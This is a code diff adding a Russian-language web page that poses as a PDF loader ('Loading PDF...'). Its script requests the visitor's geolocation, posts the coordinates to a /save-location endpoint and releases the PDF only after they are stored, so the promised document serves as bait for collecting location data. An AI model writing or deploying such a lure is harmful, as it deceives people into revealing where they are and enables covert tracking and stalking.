@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Открытие PDF</title>
+</head>
+<body>
+    <h1>Загрузка PDF...</h1>
+    <script>
+        // Запрашиваем геолокацию
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const { latitude, longitude } = position.coords;
+
+                    // Отправляем координаты на сервер
+                    try {
+                        const response = await fetch('/save-location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ latitude, longitude })
+                        });
+                        const result = await response.json();
+                        if (result.success) {
+                            // Перенаправляем на PDF
+                            window.location.href = '/sample.pdf';
+                        } else {
+                            alert('Ошибка при сохранении данных');
+                        }
+                    } catch (err) {
+                        console.error('Ошибка:', err);
+                        alert('Ошибка сервера');
+                    }
+                },
+                (error) => {
+                    console.error('Ошибка геолокации:', error);
+                    alert('Пожалуйста, разрешите доступ к геолокации');
+                }
+            );
+        } else {
+            alert('Геолокация не поддерживается вашим браузером');
+        }
+    </script>
+</body>
+</html>
